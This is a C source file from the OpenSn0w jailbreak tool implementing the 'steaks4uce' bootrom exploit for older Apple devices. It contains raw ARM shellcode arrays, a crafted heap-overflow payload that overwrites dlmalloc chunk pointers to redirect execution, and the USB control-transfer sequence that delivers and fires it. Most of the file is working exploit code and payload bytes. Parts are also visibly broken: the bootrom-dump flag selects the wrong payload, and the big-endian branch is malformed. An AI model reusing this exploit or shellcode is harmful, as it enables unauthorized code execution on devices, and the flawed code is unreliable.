/* OpenSn0w 
 * Open source equivalent of redsn0w
 * Brought to you by rms, acfrazier & Maximus
 * Special thanks to iH8sn0w & MuscleNerd
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 **/

#include "sn0w.h"

extern bool dump_bootrom;

/* The following is from Chronic-Dev's syringe */

unsigned char steaks4uce_payload[] = {
	0x7f, 0x46, 0x07, 0xe0, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46,
	0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0x59, 0x48, 0x02, 0x68,
	0x59, 0x48, 0x90, 0x42, 0x0a, 0xd1, 0x59, 0x49, 0x39, 0x60, 0x59, 0x49,
	0x79, 0x60, 0x59, 0x49, 0xb9, 0x60, 0x59, 0x49, 0x38, 0x1c, 0x0c, 0x30,
	0x01, 0x60, 0x0d, 0xe0, 0x57, 0x48, 0x90, 0x42, 0x0a, 0xd1, 0x57, 0x49,
	0x39, 0x60, 0x52, 0x49, 0x79, 0x60, 0x56, 0x49, 0xb9, 0x60, 0x52, 0x49,
	0x38, 0x1c, 0x0c, 0x30, 0x01, 0x60, 0xff, 0xe7, 0x38, 0x1c, 0x0c, 0x30,
	0x03, 0x68, 0x98, 0x47, 0x51, 0x48, 0x52, 0x49, 0x3b, 0x68, 0x98, 0x47,
	0x51, 0x48, 0x4f, 0x49, 0x4a, 0x68, 0x00, 0xf0, 0x77, 0xf8, 0x00, 0x28,
	0xd2, 0xd0, 0x06, 0x1c, 0x4e, 0x48, 0x4b, 0x49, 0x4a, 0x68, 0x00, 0xf0,
	0x6f, 0xf8, 0x00, 0x28, 0xca, 0xd0, 0x05, 0x1c, 0x11, 0x20, 0x14, 0x24,
	0x29, 0x19, 0x2a, 0x19, 0x20, 0x23, 0x49, 0x4c, 0x00, 0x94, 0x00, 0x24,
	0x01, 0x94, 0x02, 0x94, 0x7c, 0x68, 0xa0, 0x47, 0x11, 0x20, 0x0c, 0x24,
	0x31, 0x19, 0x32, 0x19, 0xb3, 0x68, 0x00, 0x24, 0x00, 0x94, 0x24, 0x24,
	0x64, 0x19, 0x01, 0x94, 0x14, 0x24, 0x64, 0x19, 0x02, 0x94, 0x7c, 0x68,
	0xa0, 0x47, 0x3a, 0x48, 0x0c, 0x21, 0x89, 0x19, 0xb2, 0x68, 0x15, 0x1c,
	0x00, 0xf0, 0x42, 0xf8, 0x3b, 0x48, 0x36, 0x49, 0x2a, 0x1c, 0x00, 0xf0,
	0x45, 0xf8, 0x00, 0x28, 0x08, 0xd0, 0x01, 0x1c, 0x38, 0x48, 0x36, 0x4a,
	0x00, 0xf0, 0x3e, 0xf8, 0x00, 0x28, 0x01, 0xd0, 0x36, 0x49, 0x01, 0x60,
	0x36, 0x48, 0x2e, 0x49, 0x2a, 0x1c, 0x00, 0xf0, 0x35, 0xf8, 0x00, 0x28,
	0x08, 0xd0, 0x01, 0x1c, 0x33, 0x48, 0x2e, 0x4a, 0x00, 0xf0, 0x2e, 0xf8,
	0x00, 0x28, 0x01, 0xd0, 0x31, 0x49, 0x01, 0x60, 0x31, 0x48, 0x26, 0x49,
	0x2a, 0x1c, 0x00, 0xf0, 0x25, 0xf8, 0x00, 0x28, 0x08, 0xd0, 0x01, 0x1c,
	0x2e, 0x48, 0x26, 0x4a, 0x00, 0xf0, 0x1e, 0xf8, 0x00, 0x28, 0x01, 0xd0,
	0x2c, 0x49, 0x01, 0x60, 0x2c, 0x48, 0x1e, 0x49, 0x2a, 0x1c, 0x2c, 0x4b,
	0x00, 0xf0, 0x16, 0xf8, 0x00, 0x28, 0x03, 0xd0, 0x2a, 0x49, 0x01, 0x60,
	0x2a, 0x49, 0x41, 0x60, 0x00, 0x20, 0x18, 0x49, 0x00, 0x22, 0xbb, 0x68,
	0x98, 0x47, 0x65, 0xe7, 0x0b, 0x78, 0x03, 0x70, 0x01, 0x30, 0x01, 0x31,
	0x01, 0x3a, 0x00, 0x2a, 0xf8, 0xd1, 0x70, 0x47, 0x00, 0x23, 0xff, 0xe7,
	0x10, 0xb5, 0x0c, 0x68, 0x84, 0x42, 0x04, 0xd1, 0x00, 0x2b, 0x07, 0xd0,
	0x4c, 0x68, 0x9c, 0x42, 0x04, 0xd0, 0x02, 0x31, 0x02, 0x3a, 0x00, 0x2a,
	0xf3, 0xd1, 0x00, 0x21, 0x08, 0x1c, 0x10, 0xbd, 0x88, 0x02, 0x00, 0x00,
	0x30, 0x2e, 0x34, 0x00, 0xe9, 0x30, 0x00, 0x00, 0x99, 0x08, 0x00, 0x00,
	0x39, 0x33, 0x00, 0x00, 0x59, 0x10, 0x00, 0x00, 0x30, 0x2e, 0x35, 0x2e,
	0xf1, 0x30, 0x00, 0x00, 0x41, 0x33, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22,
	0x00, 0x40, 0x02, 0x00, 0x41, 0x54, 0x41, 0x44, 0x47, 0x41, 0x42, 0x4b,
	0x00, 0x02, 0x00, 0x00, 0x1a, 0x78, 0xff, 0x2a, 0x01, 0x20, 0x40, 0x42,
	0x00, 0x20, 0x00, 0x20, 0xf3, 0xdf, 0x90, 0xb5, 0x20, 0x1c, 0x90, 0xbd,
	0x01, 0x20, 0x90, 0xbd, 0x11, 0x9b, 0x00, 0x2b, 0x01, 0x20, 0x08, 0xb0,
	0x00, 0x20, 0x08, 0xb0, 0x90, 0xb5, 0x01, 0xaf, 0x82, 0xb0, 0xf0, 0x24,
	0x00, 0x4b, 0x18, 0x47, 0x00, 0x00, 0x00, 0x09
};

unsigned int steaks4uce_payload_len = 488;

unsigned char steaks4uce_bootrom_dump_sc[] = {
	0x7f, 0x46, 0x08, 0xe0, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46,
	0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0xc0, 0x46, 0x0e, 0x48,
	0x00, 0x21, 0x0e, 0x4a, 0x00, 0xf0, 0x0f, 0xf8, 0x0d, 0x48, 0x02, 0x68,
	0x0d, 0x48, 0x90, 0x42, 0x01, 0xd1, 0x0d, 0x4b, 0x03, 0xe0, 0x0d, 0x48,
	0x90, 0x42, 0x00, 0xd1, 0x0c, 0x4b, 0x06, 0x48, 0x0c, 0x49, 0x00, 0x22,
	0x98, 0x47, 0x0b, 0x78, 0x03, 0x70, 0x01, 0x30, 0x01, 0x31, 0x01, 0x3a,
	0x00, 0x2a, 0xf8, 0xd1, 0x70, 0x47, 0x00, 0x00, 0x00, 0x00, 0x00, 0x22,
	0x00, 0x00, 0x01, 0x00, 0x88, 0x02, 0x00, 0x00, 0x30, 0x2e, 0x34, 0x00,
	0xe9, 0x30, 0x00, 0x00, 0x30, 0x2e, 0x35, 0x2e, 0xf1, 0x30, 0x00, 0x00,
	0x00, 0x40, 0x02, 0x00,
};


int steaks4uce()
{
	irecv_error_t error = IRECV_E_SUCCESS;
	int i, ret;
	unsigned char data[0x800];
	unsigned char payload[] = {
		/* free'd buffer dlmalloc header: */
		0x84, 0x00, 0x00, 0x00,	// 0x00: previous_chunk
		0x05, 0x00, 0x00, 0x00,	// 0x04: next_chunk
		/* free'd buffer contents: (malloc'd size=0x1C, real size=0x20, see sub_9C8) */
		0x80, 0x00, 0x00, 0x00,	// 0x08: (0x00) direction
		0x80, 0x62, 0x02, 0x22,	// 0x0c: (0x04) usb_response_buffer
		0xff, 0xff, 0xff, 0xff,	// 0x10: (0x08)
		0x00, 0x00, 0x00, 0x00,	// 0x14: (0x0c) data size (filled by the code just after)
		0x00, 0x01, 0x00, 0x00,	// 0x18: (0x10)
		0x00, 0x00, 0x00, 0x00,	// 0x1c: (0x14)
		0x00, 0x00, 0x00, 0x00,	// 0x20: (0x18)
		0x00, 0x00, 0x00, 0x00,	// 0x24: (0x1c)
		/* attack dlmalloc header: */
		0x15, 0x00, 0x00, 0x00,	// 0x28: previous_chunk
		0x02, 0x00, 0x00, 0x00,	// 0x2c: next_chunk : 0x2 choosed randomly :-)
		0x01, 0x38, 0x02, 0x22,	// 0x30: FD : shellcode_thumb_start()
		//0x90, 0xd7, 0x02, 0x22, // 0x34: BK : free() LR in stack
		0xfc, 0xd7, 0x02, 0x22,	// 0x34: BK : exception_irq() LR in stack
	};

	printf("Executing steaks4uce exploit ...\n");
	printf("Reseting usb counters.\n");
	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
	if (ret < 0) {
		printf("Failed to reset usb counters.\n");
		return -1;
	}

	printf("Padding to 0x23800...\n");
	memset(data, 0, 0x800);
	for (i = 0; i < 0x23800; i += 0x800) {
		ret =
		    irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800,
					   1000);
		if (ret < 0) {
			printf("Failed to push data to the device.\n");
			return -1;
		}
	}
	printf("Uploading shellcode.\n");
	memset(data, 0, 0x800);
	if(dump_bootrom)
		memcpy(data, steaks4uce_payload, sizeof(steaks4uce_payload));
	else
		memcpy(data, steaks4uce_bootrom_dump_sc, sizeof(steaks4uce_bootrom_dump_sc));
		
	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, 0x800, 1000);
	if (ret < 0) {
		printf("Failed to upload shellcode.\n");
		return -1;
	}

	printf("Reseting usb counters.\n");
	ret = irecv_control_transfer(client, 0x21, 4, 0, 0, 0, 0, 1000);
	if (ret < 0) {
		printf("Failed to reset usb counters.\n");
		return -1;
	}

	int send_size = 0x100 + sizeof(payload);
#ifdef BIG_ENDIAN
	*((unsigned int *)&payload[0x14]) = send_size;
	__builtin_bswap32(*((unsigned int *)&payload[0x14]))
	    memset(data, 0, 0x800);
	memcpy(&data[0x100], payload, sizeof(payload));
#else
	*((unsigned int *)&payload[0x14]) = send_size;
	memset(data, 0, 0x800);
	memcpy(&data[0x100], payload, sizeof(payload));
#endif

	ret =
	    irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size,
				   1000);
	if (ret < 0) {
		printf("Failed to send steaks4uce to the device.\n");
		return -1;
	}
	ret =
	    irecv_control_transfer(client, 0xA1, 1, 0, 0, data, send_size,
				   1000);
	if (ret < 0) {
		printf("Failed to execute steaks4uce.\n");
		return -1;
	}
	printf("steaks4uce sent & executed successfully.\n");

	printf("Reconnecting to device\n");
	client = irecv_reconnect(client, 2);
	if (client == NULL) {
		printf("%s\n", irecv_strerror(error));
		printf("Unable to reconnect\n");
		return -1;
	}
	
#if 0	/* not really functional, need to fix */
	if(dump_bootrom == true) {
		FILE *fp = fopen("bootrom.bin", "wb");
		uint32_t address = 0;
		unsigned char data[0x800];
		
		memset(data, 0, 0x800);
		
		client = irecv_reconnect(client, 2);
		if (client == NULL) {
			printf("%s\n", irecv_strerror(error));
			printf("Unable to reconnect\n");
			return -1;
		}
		
		do {
			error = irecv_control_transfer(client, 0xA1, 2, 0, 0, data, 0x800, 100);
			if(error < 0)
				break;
			fwrite(data, 1, 0x800, fp);
			address += 0x800;
			printf("Dumping 0x%08x\n", address);
		} while(address < 0x10000);
		
		printf("dumped.\n");
		exit(0);
	}
#endif

	return 0;
}
